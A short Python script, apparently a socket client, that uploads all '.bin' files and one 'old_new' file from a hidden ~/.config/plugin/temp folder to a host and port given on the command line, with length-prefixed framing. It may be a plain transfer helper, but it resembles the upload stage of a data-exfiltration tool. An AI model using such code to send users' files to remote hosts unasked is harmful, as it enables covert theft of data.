import socket
from sys import argv
import os
import time
import threading

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = argv[1]
port = int(argv[2])
s.connect((host, port))
file_paths = []
filenames = []
temp_folder = str(os.path.join(os.path.expanduser("~"), ".config", "plugin", "temp"))

for f in os.listdir(temp_folder):
	name = os.path.splitext(os.path.basename(f))[0]
	if f.endswith(".bin"):
		file_paths.append(os.path.join(temp_folder, f))
		filenames.append(os.path.splitext(os.path.basename(f))[0])
	if name == "old_new":
		file_paths.append(os.path.join(temp_folder, f))
		filenames.append(name)

for i in range(len(filenames)):
    size = len(filenames[i])
    size = bin(size)[2:].zfill(16)
    s.send(size.encode())
    s.send(filenames[i].encode())

    filesize = os.path.getsize(file_paths[i])
    filesize = bin(filesize)[2:].zfill(32)
    s.send(filesize.encode())

    file_to_send = open(file_paths[i], 'rb')

    l = file_to_send.read()
    s.sendall(l)
    file_to_send.close()
    print ('File Sent')
s.close()


